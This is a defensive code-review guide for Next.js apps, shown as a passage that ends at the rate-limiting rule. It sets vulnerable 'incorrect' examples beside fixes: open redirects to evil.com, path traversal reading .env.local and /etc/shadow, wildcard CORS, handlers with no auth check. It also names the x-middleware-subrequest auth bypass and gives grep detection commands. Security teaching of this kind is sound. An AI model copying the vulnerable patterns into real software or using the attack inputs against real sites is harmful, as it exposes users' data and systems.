# BeforeMerge: nextjs-review

Comprehensive code review knowledge base for Next.js, React, and TypeScript applications. Contains rules across security, performance, architecture, and quality categories. Each rule includes detailed explanations, real-world examples comparing incorrect vs. correct implementations, impact ratings, and formal weakness mappings (CWE/OWASP) to guide both AI agents and human reviewers.

## Table of Contents

### 1. Security Anti-Patterns (CRITICAL)
- 1. Prevent Cache Poisoning in ISR and SSR Routes — HIGH [CWE-444]
- 2. Never Pass Secrets or Sensitive Data to Client Components — CRITICAL [CWE-200]
- 3. Restrict CORS to Specific Allowed Origins — HIGH [CWE-942]
- 4. Understand CSRF Limitations in Server Actions — HIGH [CWE-352]
- 5. Validate File Uploads (Type, Size, Name, Content) — HIGH [CWE-434]
- 6. Set Secure Cookie Attributes (HttpOnly, Secure, SameSite) — HIGH [CWE-614,CWE-1004]
- 7. Never Rely Solely on Middleware for Authorization — CRITICAL [CWE-287]
- 8. Validate All Redirect URLs — CRITICAL [CWE-601]
- 9. Prevent Path Traversal in API Routes and File Operations — CRITICAL [CWE-22]
- 10. Implement Rate Limiting on Sensitive Endpoints — HIGH [CWE-799,CWE-307]
- 11. Authenticate Route Handlers Like Server Actions — CRITICAL [CWE-862]
- 12. Authenticate Server Actions Like API Routes — CRITICAL [CWE-862]
- 13. Validate All Server Action Inputs at the Boundary — CRITICAL [CWE-20,CWE-502]
- 14. Never Build Database Queries with String Concatenation — CRITICAL [CWE-89]
- 15. Sanitize All HTML Before Using dangerouslySetInnerHTML — CRITICAL [CWE-79]
### 2. Performance Patterns (HIGH)
- 16. Avoid Barrel File Imports in Client Components — HIGH
- 17. Use Dynamic Imports for Heavy Client Components — HIGH
- 18. Use next/font Instead of External Font Loading — MEDIUM
- 19. Use next/image Instead of Raw img Tags — HIGH
- 20. Use Stable, Unique Keys for List Items (Never Index) — MEDIUM
- 21. Eliminate N+1 Database Queries — CRITICAL [CWE-400]
- 22. Parallelize Independent Async Operations — CRITICAL
- 23. Prefer Server Components — Only Add 'use client' When Necessary — HIGH
- 24. Avoid Stale Closure Bugs in Hooks and Callbacks — MEDIUM
- 25. Prevent Unnecessary Re-renders from Unstable References — HIGH
- 26. Always Return Cleanup Functions from useEffect — HIGH
### 3. Architecture Patterns (MEDIUM)
- 27. Add Error Boundaries Around Unreliable Content — MEDIUM
- 28. Break Up God Components Into Focused, Composable Units — MEDIUM
- 29. Implement loading.tsx and error.tsx at Every Route Segment — MEDIUM
### 4. Code Quality (LOW-MEDIUM)
- 30. Never Hardcode Secrets — Use Environment Variables Properly — HIGH [CWE-798]
- 31. Never Use Type Assertions on External Data — Validate Instead — MEDIUM [CWE-20]
- 32. Ban any at Trust Boundaries — Use unknown with Validation — HIGH [CWE-20]
- 33. Validate External Data at System Boundaries — MEDIUM [CWE-20]

---

## Rules

## Prevent Cache Poisoning in ISR and SSR Routes

**Impact: HIGH (denial of service or content injection affecting all users via poisoned cache)**

Next.js has had multiple cache poisoning vulnerabilities where a single crafted request could poison the cache for an ISR or SSR page, serving blank or malicious content to all subsequent visitors:

- **CVE-2025-49826** (CVSS 7.5): A race condition in Next.js 15.1.0–15.1.7 allowed a 204 response to be cached for ISR pages, serving blank pages to all users. Fixed in 15.1.8.
- **CVE-2024-46982** (CVSS 7.5): Non-dynamic Pages Router SSR pages incorrectly received `s-maxage=1` cache headers, allowing upstream CDNs to cache and serve attacker-influenced responses. Affected 13.5.1–13.5.6 and 14.0.0–14.2.9.

Even on patched versions, cache misconfiguration remains a risk. Understand what's cached, for how long, and who can influence it.

**Incorrect (dangerous cache patterns):**

```typescript
// ❌ Long revalidation on user-specific content
// app/dashboard/page.tsx
export const revalidate = 3600 // Caches for 1 hour — but content varies by user!

export default async function Dashboard() {
  const session = await auth()
  const data = await getUserData(session.user.id)
  return <DashboardView data={data} /> // User A sees User B's cached dashboard
}
```

```typescript
// ❌ Setting permissive cache headers on dynamic API routes
// app/api/user/route.ts
export async function GET(request: NextRequest) {
  const user = await getCurrentUser(request)
  return NextResponse.json(user, {
    headers: {
      'Cache-Control': 'public, s-maxage=60', // CDN caches user-specific data!
    },
  })
}
```

```typescript
// ❌ ISR page that renders differently based on cookies/headers
// app/pricing/page.tsx
export const revalidate = 600

export default async function Pricing() {
  const country = headers().get('x-country') // Varies by request
  const prices = await getPrices(country)     // But ISR caches one version!
  return <PriceTable prices={prices} />
}
```

**Correct (safe caching patterns):**

```typescript
// ✅ Never cache user-specific content with ISR
// app/dashboard/page.tsx
export const dynamic = 'force-dynamic' // No caching

export default async function Dashboard() {
  const session = await auth()
  const data = await getUserData(session.user.id)
  return <DashboardView data={data} />
}
```

```typescript
// ✅ Private cache headers for user-specific API responses
// app/api/user/route.ts
export async function GET(request: NextRequest) {
  const user = await getCurrentUser(request)
  return NextResponse.json(user, {
    headers: {
      'Cache-Control': 'private, no-store', // Never cached by CDN
    },
  })
}
```

```typescript
// ✅ Use generateStaticParams for known variants, not request-based branching
// app/pricing/[country]/page.tsx
export async function generateStaticParams() {
  return [{ country: 'us' }, { country: 'eu' }, { country: 'uk' }]
}

export default async function Pricing({ params }: { params: { country: string } }) {
  const prices = await getPrices(params.country)
  return <PriceTable prices={prices} />
}
```

**Cache safety checklist:**

1. **Never use `revalidate` on pages that read cookies, headers, or session data** — use `dynamic = 'force-dynamic'` instead
2. **Set `Cache-Control: private, no-store`** on API responses containing user-specific data
3. **Keep Next.js updated** — cache poisoning CVEs have affected multiple major versions
4. **If using a CDN, configure it to not cache 204 responses** and to respect `Vary` headers
5. **Test ISR pages in incognito** — verify cached content doesn't leak between users

**Detection hints:**

```bash
# Find ISR pages that also read cookies or headers (likely misconfigured)
grep -rn "revalidate" src/app --include="*.ts" --include="*.tsx" -l | \
  xargs grep -l "cookies\|headers\|auth\|session"
# Find API routes setting public cache headers
grep -rn "s-maxage\|public.*max-age" src/app/api --include="*.ts"
```

Reference: [CVE-2025-49826](https://github.com/vercel/next.js/security/advisories/GHSA-67rr-84xm-4c7r) · [CVE-2024-46982](https://github.com/advisories/GHSA-gp8f-8m3g-qvj9) · [CWE-444: Inconsistent Interpretation of HTTP Requests](https://cwe.mitre.org/data/definitions/444.html)

---

## Never Pass Secrets or Sensitive Data to Client Components

**Impact: CRITICAL (prevents exposure of API keys, tokens, and internal data to browsers)**

Any prop passed from a Server Component to a Client Component is serialized into the HTML response and visible in the browser. This includes the RSC payload, which is inspectable in the network tab. Never pass API keys, internal IDs, full database records, or any data the client doesn't need.

**Incorrect (leaking secrets via props):**

```typescript
// app/page.tsx (Server Component)
export default async function Page() {
  const config = {
    apiKey: process.env.STRIPE_SECRET_KEY,   // ❌ Secret key!
    dbUrl: process.env.DATABASE_URL,          // ❌ Connection string!
    internalUserId: 'usr_admin_29384',        // ❌ Internal ID!
  }

  return <Dashboard config={config} />
}

// components/Dashboard.tsx
'use client'
export function Dashboard({ config }) {
  // All of config is now in the browser HTML and RSC payload
}
```

**Also incorrect (over-fetching database records):**

```typescript
// ❌ Passing entire user record to client
async function Page() {
  const user = await db.user.findUnique({
    where: { id: userId },
  }) // Returns 30+ fields including passwordHash, ssn, etc.

  return <Profile user={user} />
}
```

**Correct (pass only what the client needs):**

```typescript
// app/page.tsx (Server Component)
export default async function Page() {
  // ✅ Keep secrets server-side, pass only public config
  const publishableKey = process.env.NEXT_PUBLIC_STRIPE_KEY

  return <Dashboard stripeKey={publishableKey} />
}
```

```typescript
// ✅ Select only the fields the client needs
async function Page() {
  const user = await db.user.findUnique({
    where: { id: userId },
    select: {
      name: true,
      email: true,
      avatarUrl: true,
      // Only fields the UI actually renders
    },
  })

  return <Profile user={user} />
}
```

**Use `server-only` to prevent accidental imports:**

```typescript
// lib/secrets.ts
import 'server-only'

export const config = {
  stripeSecret: process.env.STRIPE_SECRET_KEY!,
  dbUrl: process.env.DATABASE_URL!,
}
// Importing this file in a Client Component will now cause a build error
```

**Detection hints:**

```bash
# Find env vars being passed as props (potential leaks)
grep -rn "process\.env\." src/ --include="*.tsx" | grep -v "NEXT_PUBLIC"
# Find large objects being passed to client components
grep -rn "findUnique\|findFirst\|findMany" src/ --include="*.tsx" | grep -v "select:"
```

Reference: [Next.js Server Components](https://nextjs.org/docs/app/building-your-application/rendering/server-components) · [server-only package](https://nextjs.org/docs/app/building-your-application/rendering/composition-patterns#keeping-server-only-code-out-of-the-client-environment)

---

## Restrict CORS to Specific Allowed Origins

**Impact: HIGH (allows unauthorized cross-origin access to API endpoints and user data)**

Next.js route handlers have no CORS headers by default — which is secure. Problems start when developers add permissive CORS to "fix" cross-origin errors during development and ship it to production. The two most dangerous patterns:

1. **`Access-Control-Allow-Origin: *`** — any website can read your API responses
2. **Reflecting the request `Origin` header** — any website can make credentialed requests

**Incorrect (permissive CORS):**

```typescript
// app/api/user/route.ts
// ❌ Wildcard allows ANY website to read user data
export async function GET(request: NextRequest) {
  const user = await getCurrentUser(request)
  return NextResponse.json(user, {
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE',
      'Access-Control-Allow-Headers': '*',
    },
  })
}
```

```typescript
// ❌ Reflecting Origin without validation — even worse with credentials
export async function GET(request: NextRequest) {
  const origin = request.headers.get('origin')
  return NextResponse.json(data, {
    headers: {
      'Access-Control-Allow-Origin': origin ?? '*', // Reflects anything!
      'Access-Control-Allow-Credentials': 'true',   // With cookies!
    },
  })
}
```

```typescript
// ❌ middleware.ts blanket CORS for all API routes
export function middleware(request: NextRequest) {
  const response = NextResponse.next()
  response.headers.set('Access-Control-Allow-Origin', '*')
  return response
}
```

**Correct (strict CORS with origin allowlist):**

```typescript
// lib/cors.ts
const ALLOWED_ORIGINS = new Set([
  'https://app.example.com',
  'https://admin.example.com',
  ...(process.env.NODE_ENV === 'development' ? ['http://localhost:3000'] : []),
])

export function getCorsHeaders(request: NextRequest) {
  const origin = request.headers.get('origin')

  // Only allow listed origins
  if (!origin || !ALLOWED_ORIGINS.has(origin)) {
    return {} // No CORS headers = browser blocks the request
  }

  return {
    'Access-Control-Allow-Origin': origin,
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    'Access-Control-Allow-Credentials': 'true',
    'Access-Control-Max-Age': '86400', // Cache preflight for 24 hours
  }
}
```

```typescript
// app/api/user/route.ts
import { getCorsHeaders } from '@/lib/cors'

// ✅ Handle preflight
export async function OPTIONS(request: NextRequest) {
  return new NextResponse(null, {
    status: 204,
    headers: getCorsHeaders(request),
  })
}

export async function GET(request: NextRequest) {
  const session = await auth()
  if (!session?.user) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }

  const user = await getUser(session.user.id)
  return NextResponse.json(user, {
    headers: getCorsHeaders(request),
  })
}
```

**Key CORS rules:**

1. **Never use `*` with `Access-Control-Allow-Credentials: true`** — browsers block this, but developers often work around it with Origin reflection, which is worse
2. **Validate the Origin against an allowlist** — do not reflect it blindly
3. **Keep the allowlist in server-side config** — not in client code or env vars prefixed with `NEXT_PUBLIC_`
4. **If your API is only consumed by your own frontend** — you may not need CORS at all (same-origin requests don't need it)

**Detection hints:**

```bash
# Find permissive CORS headers
grep -rn "Access-Control-Allow-Origin.*\*" src/ --include="*.ts" --include="*.tsx"
# Find Origin reflection
grep -rn "Access-Control-Allow-Origin.*origin\|Allow-Origin.*request.headers" src/ --include="*.ts"
```

Reference: [MDN CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) · [CWE-942: Permissive Cross-domain Policy](https://cwe.mitre.org/data/definitions/942.html)

---

## Understand CSRF Limitations in Server Actions

**Impact: HIGH (cross-site request forgery enabling unauthorized state changes on behalf of authenticated users)**

Next.js Server Actions have built-in CSRF mitigation: they only accept POST requests and compare the `Origin` header against the host. However, this is **not** a CSRF token — it has known limitations:

1. **Reverse proxies that strip the `Origin` header** — some proxies, load balancers, or WAFs remove or rewrite the `Origin` header, disabling the check entirely
2. **Misconfigured `serverActions.allowedOrigins`** — adding domains to the allowlist expands who can invoke your actions cross-origin
3. **Same-site subdomains** — if an attacker controls `evil.example.com` and your app is on `app.example.com`, same-origin policies may not protect you

**Incorrect (assuming Server Actions are CSRF-proof):**

```typescript
// next.config.js
// ❌ Overly permissive allowedOrigins
module.exports = {
  experimental: {
    serverActions: {
      allowedOrigins: ['*'], // Disables CSRF protection entirely!
    },
  },
}
```

```typescript
// next.config.js
// ❌ Allowing untrusted origins
module.exports = {
  experimental: {
    serverActions: {
      allowedOrigins: [
        'app.example.com',
        'staging.example.com',
        'partner-site.com', // Do you trust this domain's security?
      ],
    },
  },
}
```

**Correct (tighten CSRF protection):**

```typescript
// next.config.js
// ✅ Only allow your own domains
module.exports = {
  experimental: {
    serverActions: {
      allowedOrigins: ['app.example.com'], // Strict — only your production domain
    },
  },
}
```

```typescript
// ✅ For sensitive mutations, add a CSRF token as defense-in-depth
// lib/csrf.ts
import { cookies } from 'next/headers'
import { randomBytes } from 'crypto'

export function generateCsrfToken() {
  const token = randomBytes(32).toString('hex')
  cookies().set('csrf-token', token, {
    httpOnly: true,
    sameSite: 'strict',
    secure: process.env.NODE_ENV === 'production',
  })
  return token
}

export function validateCsrfToken(token: string) {
  const stored = cookies().get('csrf-token')?.value
  if (!stored || stored !== token) {
    throw new Error('Invalid CSRF token')
  }
}
```

```typescript
// ✅ Use the token in high-value Server Actions
'use server'

import { validateCsrfToken } from '@/lib/csrf'
import { z } from 'zod'

const TransferSchema = z.object({
  csrfToken: z.string(),
  toAccount: z.string(),
  amount: z.number().positive(),
})

export async function transferFunds(rawInput: unknown) {
  const { csrfToken, toAccount, amount } = TransferSchema.parse(rawInput)
  validateCsrfToken(csrfToken) // Extra layer for high-value actions
  // ... proceed with transfer
}
```

**If behind a reverse proxy, ensure Origin is forwarded:**

```nginx
# nginx — pass the Origin header through
proxy_set_header Origin $http_origin;
proxy_set_header Host $host;
```

**Detection hints:**

```bash
# Check if allowedOrigins is configured (and what it allows)
grep -rn "allowedOrigins" next.config.* --include="*.js" --include="*.ts" --include="*.mjs"
# Check if proxies might strip Origin
grep -rn "proxy_set_header\|ProxyPass\|X-Forwarded" nginx.conf apache.conf
```

Reference: [Next.js Server Actions Security](https://nextjs.org/blog/security-nextjs-server-components-actions) · [CWE-352: Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html)

---

## Validate File Uploads (Type, Size, Name, Content)

**Impact: HIGH (prevents remote code execution, storage exhaustion, and malicious file serving)**

Next.js route handlers accept `FormData` with files but provide zero built-in validation. Developers commonly check `file.type` (which is client-spoofable), skip size limits, and pass filenames directly to `fs.writeFile`. A malicious upload can:

- Execute server-side code if saved with a dangerous extension (`.js`, `.sh`, `.php`)
- Exhaust disk space with oversized files
- Traverse directories via crafted filenames (`../../etc/cron.d/malicious`)
- Serve malware to other users if re-served without content-type restrictions

**Incorrect (no validation):**

```typescript
// app/api/upload/route.ts
// ❌ Trusts everything from the client
export async function POST(request: NextRequest) {
  const formData = await request.formData()
  const file = formData.get('file') as File

  const bytes = await file.arrayBuffer()
  const buffer = Buffer.from(bytes)

  // ❌ Uses original filename — could be "../../.env" or "shell.js"
  await writeFile(path.join('uploads', file.name), buffer)

  return NextResponse.json({ url: `/uploads/${file.name}` })
}
```

**Correct (comprehensive validation):**

```typescript
// app/api/upload/route.ts
import { writeFile } from 'fs/promises'
import path from 'path'
import { randomUUID } from 'crypto'

const ALLOWED_TYPES = new Set(['image/jpeg', 'image/png', 'image/webp', 'application/pdf'])
const MAX_SIZE = 5 * 1024 * 1024 // 5 MB
const UPLOAD_DIR = path.resolve(process.cwd(), 'uploads')

// Magic bytes for common image types
const MAGIC_BYTES: Record<string, number[]> = {
  'image/jpeg': [0xFF, 0xD8, 0xFF],
  'image/png': [0x89, 0x50, 0x4E, 0x47],
  'image/webp': [0x52, 0x49, 0x46, 0x46], // RIFF
  'application/pdf': [0x25, 0x50, 0x44, 0x46], // %PDF
}

function validateMagicBytes(buffer: Buffer, claimedType: string): boolean {
  const expected = MAGIC_BYTES[claimedType]
  if (!expected) return false
  return expected.every((byte, i) => buffer[i] === byte)
}

export async function POST(request: NextRequest) {
  const formData = await request.formData()
  const file = formData.get('file')

  // 1. Verify it's actually a File object
  if (!file || !(file instanceof File)) {
    return NextResponse.json({ error: 'No file provided' }, { status: 400 })
  }

  // 2. Check file size BEFORE reading into memory
  if (file.size > MAX_SIZE) {
    return NextResponse.json({ error: 'File too large (max 5MB)' }, { status: 413 })
  }

  // 3. Check MIME type against allowlist
  if (!ALLOWED_TYPES.has(file.type)) {
    return NextResponse.json({ error: 'File type not allowed' }, { status: 415 })
  }

  const bytes = await file.arrayBuffer()
  const buffer = Buffer.from(bytes)

  // 4. Validate magic bytes (file.type is client-spoofable)
  if (!validateMagicBytes(buffer, file.type)) {
    return NextResponse.json({ error: 'File content does not match type' }, { status: 415 })
  }

  // 5. Generate a safe filename (never use the original)
  const ext = path.extname(file.name).toLowerCase()
  const safeExtensions = new Set(['.jpg', '.jpeg', '.png', '.webp', '.pdf'])
  if (!safeExtensions.has(ext)) {
    return NextResponse.json({ error: 'Invalid file extension' }, { status: 400 })
  }

  const safeFilename = `${randomUUID()}${ext}`
  const filePath = path.resolve(UPLOAD_DIR, safeFilename)

  // 6. Verify path is within upload directory
  if (!filePath.startsWith(UPLOAD_DIR + path.sep)) {
    return NextResponse.json({ error: 'Invalid path' }, { status: 400 })
  }

  await writeFile(filePath, buffer)
  return NextResponse.json({ url: `/uploads/${safeFilename}` })
}
```

**Validation checklist:**

| Check | Why | How |
|-------|-----|-----|
| File size | Prevent storage exhaustion | Compare `file.size` before reading |
| MIME type | Reject dangerous file types | Allowlist with `Set` |
| Magic bytes | Detect spoofed MIME types | Check first bytes of file content |
| Extension | Prevent executable uploads | Allowlist of safe extensions |
| Filename | Prevent path traversal | Generate UUID, never use original |
| Output path | Defense-in-depth | `path.resolve()` + prefix check |

**Detection hints:**

```bash
# Find upload handlers without validation
grep -rn "formData.get\|request.formData" src/app/api --include="*.ts" -l | \
  xargs grep -L "ALLOWED_TYPES\|MAX_SIZE\|magic\|validate"
# Find direct use of file.name in paths
grep -rn "file.name\|originalFilename" src/ --include="*.ts" | grep -i "join\|resolve\|write"
```

Reference: [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) · [CWE-434: Unrestricted Upload](https://cwe.mitre.org/data/definitions/434.html)

---

## Set Secure Cookie Attributes (HttpOnly, Secure, SameSite)

**Impact: HIGH (prevents session hijacking via XSS and cross-site request forgery)**

The Next.js `cookies()` API makes it easy to set cookies but does **not** enforce secure defaults. A session cookie missing `HttpOnly` can be stolen by XSS (`document.cookie`). A cookie missing `Secure` can be intercepted over HTTP. A cookie missing `SameSite` defaults to `Lax` in modern browsers, but explicit is better than implicit for security-critical cookies.

**Incorrect (missing security attributes):**

```typescript
// ❌ No HttpOnly — any XSS can steal this cookie
import { cookies } from 'next/headers'

export async function login(credentials: unknown) {
  const session = await createSession(credentials)
  cookies().set('session-token', session.token)
  // Default: no HttpOnly, no Secure, SameSite=Lax (browser default)
}
```

```typescript
// ❌ Explicitly insecure
cookies().set('session-token', token, {
  httpOnly: false,  // Accessible via document.cookie — XSS can steal it
  secure: false,    // Sent over HTTP — vulnerable to MITM
  sameSite: 'none', // Sent on ALL cross-site requests — CSRF risk
})
```

```typescript
// ❌ Setting cookies via headers without attributes
return new NextResponse(null, {
  headers: {
    'Set-Cookie': `token=${value}`, // No attributes at all!
  },
})
```

**Correct (secure cookie configuration):**

```typescript
import { cookies } from 'next/headers'

// ✅ Always set all three security attributes on session cookies
export async function login(credentials: unknown) {
  const session = await createSession(credentials)

  cookies().set('session-token', session.token, {
    httpOnly: true,                                    // Not accessible via JS
    secure: process.env.NODE_ENV === 'production',     // HTTPS only in prod
    sameSite: 'lax',                                   // Prevents most CSRF
    path: '/',                                         // Available site-wide
    maxAge: 60 * 60 * 24 * 7,                          // 7 days
  })
}
```

```typescript
// ✅ For auth tokens that never need client-side access
cookies().set('auth-token', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',  // Strictest: never sent cross-site
  path: '/',
  maxAge: 60 * 60 * 24, // 24 hours
})

// ✅ For CSRF tokens that DO need client-side access
cookies().set('csrf-token', csrfToken, {
  httpOnly: false,     // Client JS needs to read this to send in headers
  secure: true,
  sameSite: 'strict',
  path: '/',
})
```

**Create a helper to enforce defaults:**

```typescript
// lib/cookies.ts
import { cookies } from 'next/headers'

const SECURE_DEFAULTS: Partial<ResponseCookie> = {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax' as const,
  path: '/',
}

export function setSecureCookie(
  name: string,
  value: string,
  options?: Partial<ResponseCookie>
) {
  cookies().set(name, value, { ...SECURE_DEFAULTS, ...options })
}

// Usage:
setSecureCookie('session-token', token, { maxAge: 60 * 60 * 24 * 7 })
```

**Cookie attribute reference:**

| Attribute | Purpose | Value for session cookies |
|-----------|---------|--------------------------|
| `httpOnly` | Blocks `document.cookie` access | `true` (always) |
| `secure` | HTTPS only | `true` in production |
| `sameSite` | Controls cross-site sending | `lax` or `strict` |
| `path` | URL scope | `/` (or narrowest needed) |
| `maxAge` | Expiry in seconds | Match your session lifetime |

**Detection hints:**

```bash
# Find cookie sets without security attributes
grep -rn "cookies().set\|\.set(" src/ --include="*.ts" --include="*.tsx" | grep -v "httpOnly\|HttpOnly"
# Find raw Set-Cookie headers
grep -rn "Set-Cookie" src/ --include="*.ts" --include="*.tsx"
```

Reference: [Next.js cookies() API](https://nextjs.org/docs/app/api-reference/functions/cookies) · [CWE-614: Sensitive Cookie Without 'Secure'](https://cwe.mitre.org/data/definitions/614.html) · [CWE-1004: Sensitive Cookie Without 'HttpOnly'](https://cwe.mitre.org/data/definitions/1004.html)

---

## Never Rely Solely on Middleware for Authorization

**Impact: CRITICAL (complete authentication bypass allowing unauthorized access to all protected routes)**

CVE-2025-29927 (CVSS 9.1) proved that Next.js middleware can be bypassed entirely with a single HTTP header. An internal `x-middleware-subrequest` header — designed to prevent infinite recursion — was trusted from external clients. Any attacker who set this header skipped all middleware logic, including auth checks, redirects, and access control. This affected Next.js 11.1.4 through 15.2.2.

Even on patched versions, middleware is a **convenience layer**, not a security boundary. The defense-in-depth rule: **every route handler and Server Action must independently verify authentication and authorization.**

**Incorrect (relying solely on middleware for auth):**

```typescript
// middleware.ts — the ONLY place auth is checked
import { NextResponse } from 'next/server'
import { verifyToken } from '@/lib/auth'

export function middleware(request: NextRequest) {
  const token = request.cookies.get('session')?.value
  if (!token || !verifyToken(token)) {
    return NextResponse.redirect(new URL('/login', request.url))
  }
  return NextResponse.next()
}

export const config = {
  matcher: ['/dashboard/:path*', '/api/admin/:path*'],
}

// ❌ Route handler assumes middleware already checked auth
// app/api/admin/users/route.ts
export async function DELETE(request: NextRequest) {
  const { userId } = await request.json()
  await db.user.delete({ where: { id: userId } }) // No auth check!
  return NextResponse.json({ success: true })
}
```

**Correct (auth in middleware AND in each handler):**

```typescript
// middleware.ts — first layer (convenience: redirects, early rejection)
export function middleware(request: NextRequest) {
  const token = request.cookies.get('session')?.value
  if (!token) {
    return NextResponse.redirect(new URL('/login', request.url))
  }
  return NextResponse.next()
}

// app/api/admin/users/route.ts — second layer (authoritative)
import { auth } from '@/lib/auth'

export async function DELETE(request: NextRequest) {
  const session = await auth() // Always re-verify
  if (!session?.user) {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })
  }
  if (session.user.role !== 'admin') {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
  }

  const { userId } = await request.json()
  await db.user.delete({ where: { id: userId } })
  return NextResponse.json({ success: true })
}
```

**If self-hosting, strip the header at the reverse proxy:**

```nginx
# nginx — block the internal header from external clients
proxy_set_header x-middleware-subrequest "";
```

**Detection hints:**

```bash
# Find route handlers that don't contain auth checks
grep -rn "export async function GET\|export async function POST\|export async function PUT\|export async function DELETE" src/ --include="*.ts" --include="*.tsx" -l | \
  xargs grep -L "auth\|session\|getServerSession"
# Check if middleware is the only auth layer
grep -rn "matcher.*dashboard\|matcher.*admin\|matcher.*api" middleware.ts
```

Reference: [CVE-2025-29927](https://nvd.nist.gov/vuln/detail/CVE-2025-29927) · [Vercel Postmortem](https://vercel.com/blog/postmortem-on-next-js-middleware-bypass) · [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)

---

## Validate All Redirect URLs

**Impact: CRITICAL (prevents open redirect attacks used for phishing and credential theft)**

Open redirects occur when an application redirects users to a URL provided in query parameters or request bodies without validation. Attackers use this to send users to phishing sites that appear to originate from your domain (e.g., `yourapp.com/login?next=https://evil.com`).

**Incorrect (redirecting to unvalidated user input):**

```typescript
// ❌ Redirect to whatever the query param says
// app/api/auth/callback/route.ts
export async function GET(request: Request) {
  const { searchParams } = new URL(request.url)
  const redirectUrl = searchParams.get('next') || '/'

  // Attacker crafts: /api/auth/callback?next=https://evil.com/steal-creds
  return Response.redirect(redirectUrl)
}
```

```typescript
// ❌ Also dangerous in Server Actions
'use server'
export async function login(formData: FormData) {
  await authenticate(formData)
  const next = formData.get('next') as string
  redirect(next) // Could redirect anywhere
}
```

**Correct (validate against an allowlist or ensure relative path):**

```typescript
// ✅ Only allow relative paths (same-origin redirects)
export async function GET(request: Request) {
  const { searchParams } = new URL(request.url)
  const next = searchParams.get('next') || '/'

  // Ensure it's a relative path, not an absolute URL
  const safeUrl = next.startsWith('/') && !next.startsWith('//')
    ? next
    : '/'

  return Response.redirect(new URL(safeUrl, request.url))
}
```

```typescript
// ✅ Allowlist approach for known redirect targets
const ALLOWED_REDIRECTS = ['/dashboard', '/settings', '/onboarding']

export async function GET(request: Request) {
  const { searchParams } = new URL(request.url)
  const next = searchParams.get('next') || '/dashboard'

  const safeUrl = ALLOWED_REDIRECTS.includes(next) ? next : '/dashboard'

  return Response.redirect(new URL(safeUrl, request.url))
}
```

**Detection hints:**

```bash
# Find redirect/rewrite using query params or user input
grep -rn "redirect\|Response.redirect\|router.push\|router.replace" src/ --include="*.ts" --include="*.tsx" | grep -E "searchParams|formData|params|query"
```

Reference: [OWASP Unvalidated Redirects](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html) · [CWE-601](https://cwe.mitre.org/data/definitions/601.html)

---

## Prevent Path Traversal in API Routes and File Operations

**Impact: CRITICAL (arbitrary file read/write on the server leading to credential theft or code execution)**

API routes that use user input to construct file paths — download endpoints, file serving, template loading — are vulnerable to path traversal attacks. An attacker sends `../../etc/passwd` or `../.env.local` to read files outside the intended directory. This is consistently in the OWASP Top 10.

**Incorrect (user input in file paths):**

```typescript
// app/api/files/[...path]/route.ts
// ❌ User controls the file path entirely
import { readFile } from 'fs/promises'
import path from 'path'

export async function GET(
  request: NextRequest,
  { params }: { params: { path: string[] } }
) {
  const filePath = path.join(process.cwd(), 'uploads', ...params.path)
  const file = await readFile(filePath) // ../../.env.local → reads your secrets!
  return new NextResponse(file)
}
```

```typescript
// app/api/download/route.ts
// ❌ Query param used in file path
export async function GET(request: NextRequest) {
  const filename = request.nextUrl.searchParams.get('file')
  const filePath = path.join('/var/data', filename!) // ../../../etc/shadow
  const content = await readFile(filePath)
  return new NextResponse(content)
}
```

**Correct (validate and constrain file paths):**

```typescript
// app/api/files/[...path]/route.ts
import { readFile, stat } from 'fs/promises'
import path from 'path'

const UPLOADS_DIR = path.resolve(process.cwd(), 'uploads')

export async function GET(
  request: NextRequest,
  { params }: { params: { path: string[] } }
) {
  // 1. Reject path segments that contain traversal patterns
  if (params.path.some(segment => segment.includes('..') || segment.includes('\0'))) {
    return NextResponse.json({ error: 'Invalid path' }, { status: 400 })
  }

  // 2. Resolve to absolute path
  const filePath = path.resolve(UPLOADS_DIR, ...params.path)

  // 3. Verify the resolved path is still within the allowed directory
  if (!filePath.startsWith(UPLOADS_DIR + path.sep)) {
    return NextResponse.json({ error: 'Access denied' }, { status: 403 })
  }

  // 4. Verify file exists and is a regular file (not a symlink to outside)
  try {
    const stats = await stat(filePath)
    if (!stats.isFile()) {
      return NextResponse.json({ error: 'Not a file' }, { status: 400 })
    }
  } catch {
    return NextResponse.json({ error: 'Not found' }, { status: 404 })
  }

  const file = await readFile(filePath)
  return new NextResponse(file)
}
```

```typescript
// ✅ Even better: use a lookup table instead of file paths
// app/api/download/route.ts
const ALLOWED_FILES: Record<string, string> = {
  'report-2024': '/var/data/reports/annual-2024.pdf',
  'guide': '/var/data/docs/user-guide.pdf',
}

export async function GET(request: NextRequest) {
  const fileId = request.nextUrl.searchParams.get('id')

  const filePath = ALLOWED_FILES[fileId ?? '']
  if (!filePath) {
    return NextResponse.json({ error: 'File not found' }, { status: 404 })
  }

  const file = await readFile(filePath)
  return new NextResponse(file)
}
```

**Key defenses:**

1. **`path.resolve()` + prefix check** — resolve the full path, then verify it starts with the allowed directory
2. **Reject `..` and null bytes** — catch traversal before path resolution
3. **Use allowlists** — map IDs to paths instead of using user input in paths
4. **Check `stat().isFile()`** — prevent serving directories or following symlinks out of the sandbox

**Detection hints:**

```bash
# Find file operations using user input
grep -rn "readFile\|writeFile\|createReadStream\|readdir" src/app/api --include="*.ts" | grep -i "params\|searchParams\|query"
# Find path.join with dynamic segments
grep -rn "path.join.*params\|path.resolve.*params" src/ --include="*.ts"
```

Reference: [CWE-22: Improper Limitation of a Pathname](https://cwe.mitre.org/data/definitions/22.html) · [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

---

## Implement Rate Limiting on Sensitive Endpoints

**Impact: HIGH (prevents brute force attacks, credential stuffing, and resource exhaustion)**

